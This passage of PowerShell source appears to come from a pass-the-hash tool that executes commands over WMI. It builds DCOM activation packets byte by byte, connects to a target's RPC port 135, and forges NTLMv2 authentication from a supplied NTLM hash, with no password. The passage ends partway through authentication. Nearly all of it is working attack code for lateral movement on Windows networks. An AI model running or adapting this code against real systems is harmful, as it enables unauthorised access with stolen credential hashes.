    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize",[Byte[]](0x68,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3",[Byte[]](0x90,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4",$packet_property_data_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5",[Byte[]](0x20,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader",[Byte[]](0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader",[Byte[]](0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId",[Byte[]](0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds",[Byte[]](0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader",[Byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID",[Byte[]](0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID",[Byte[]](0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer",[Byte[]](0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader",$packet_private_header)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString",$packet_target_unicode)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader",[Byte[]](0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader",[Byte[]](0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences",[Byte[]](0x01,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown",[Byte[]](0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_DCOMRemoteCreateInstance
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($Target -eq 'localhost')
{
    $Target = "127.0.0.1"
}

try
{
    $target_type = [IPAddress]$Target
    $target_short = $target_long = $Target
}
catch
{
    $error.clear()
    $target_long = $Target

    if($Target -like "*.*")
    {
        $target_short_index = $Target.IndexOf(".")
        $target_short = $Target.Substring(0,$target_short_index)
    }
    else
    {
        $target_short = $Target
    }

}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
Write-Verbose "Connecting to $Target`:135"
$WMI_client_init = New-Object System.Net.Sockets.TCPClient
$WMI_client_init.Client.ReceiveTimeout = 30000

try
{
    $WMI_client_init.Connect($Target,"135")
}
catch
{
    Write-Output "$Target did not respond"
}

if($WMI_client_init.Connected)
{
    $WMI_client_stream_init = $WMI_client_init.GetStream()
    $WMI_client_receive = New-Object System.Byte[] 2048
    $RPC_UUID = 0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a
    $packet_RPC = Get-PacketRPCBind 2 0xd0,0x16 0x02 0x00,0x00 $RPC_UUID 0x00,0x00
    $packet_RPC["RPCBind_FragLength"] = 0x74,0x00    
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()    
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $assoc_group = $WMI_client_receive[20..23]
    $packet_RPC = Get-PacketRPCRequest 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()    
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $WMI_hostname_unicode = $WMI_client_receive[42..$WMI_client_receive.Length]
    $WMI_hostname = [System.BitConverter]::ToString($WMI_hostname_unicode)
    $WMI_hostname_index = $WMI_hostname.IndexOf("-00-00-00")
    $WMI_hostname = $WMI_hostname.SubString(0,$WMI_hostname_index)
    $WMI_hostname = $WMI_hostname -replace "-00",""
    $WMI_hostname = $WMI_hostname.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $WMI_hostname = New-Object System.String ($WMI_hostname,0,$WMI_hostname.Length)

    if($target_short -cne $WMI_hostname)
    {
        Write-Verbose "WMI reports target hostname as $WMI_hostname"
        $target_short = $WMI_hostname
    }

    $WMI_client_init.Close()
    $WMI_client_stream_init.Close()
    $WMI_client = New-Object System.Net.Sockets.TCPClient
    $WMI_client.Client.ReceiveTimeout = 30000

    try
    {
        $WMI_client.Connect($target_long,"135")
    }
    catch
    {
        Write-Output "$target_long did not respond"
    }

    if($WMI_client.Connected)
    {
        $WMI_client_stream = $WMI_client.GetStream()
        $RPC_UUID = 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46
        $packet_RPC = Get-PacketRPCBind 3 0xd0,0x16 0x01 0x01,0x00 $RPC_UUID 0x00,0x00
        $packet_RPC["RPCBind_FragLength"] = 0x78,0x00
        $packet_RPC["RPCBind_AuthLength"] = 0x28,0x00
        $packet_RPC["RPCBind_NegotiateFlags"] = 0x07,0x82,0x08,0xa2
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
        $assoc_group = $WMI_client_receive[20..23]
        $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
        $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
        $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
        $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
        $WMI_domain_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
        $WMI_target_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
        $WMI_session_ID = $WMI_client_receive[44..51]
        $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
        $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
        $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
        $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
        $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $auth_hostname = (get-childitem -path env:computername).Value
        $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
        $auth_domain = $Domain
        $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
        $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
        $auth_domain_length = $auth_domain_length[0,1]
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
        $auth_domain_length = $auth_domain_length[0,1]
        $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
        $auth_username_length = $auth_username_length[0,1]
        $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
        $auth_hostname_length = $auth_hostname_length[0,1]
        $auth_domain_offset = 0x40,0x00,0x00,0x00
        $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
        $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
        $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
        $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
        $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
        $HMAC_MD5.key = $NTLM_hash_bytes
        $username_and_target = $username.ToUpper()
        $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
        $username_and_target_bytes += $auth_domain_bytes
        $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
        $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_time_bytes +
                                $client_challenge_bytes +
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_details +
                                0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00

        $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
        $HMAC_MD5.key = $NTLMv2_hash
        $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
        $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
        $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
        $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
        $NTLMv2_response_length = $NTLMv2_response_length[0,1]
        $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
        $WMI_session_key_length = 0x00,0x00
        $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

        $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                0x03,0x00,0x00,0x00,
                                0x18,0x00,
                                0x18,0x00 +
                                $auth_LM_offset +
                                $NTLMv2_response_length +
                                $NTLMv2_response_length +
                                $auth_NTLM_offset +
                                $auth_domain_length +
                                $auth_domain_length +
                                $auth_domain_offset +
                                $auth_username_length +
                                $auth_username_length +
                                $auth_username_offset +
                                $auth_hostname_length +
                                $auth_hostname_length +
                                $auth_hostname_offset +
                                $WMI_session_key_length +
                                $WMI_session_key_length +
                                $WMI_session_key_offset +
                                $WMI_negotiate_flags +
                                $auth_domain_bytes +
                                $auth_username_bytes +
                                $auth_hostname_bytes +
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                $NTLMv2_response

        $assoc_group = $WMI_client_receive[20..23]
        $packet_RPC = Get-PacketRPCAUTH3 $NTLMSSP_response
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $causality_ID = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]$causality_ID_bytes = $causality_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $unused_buffer = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
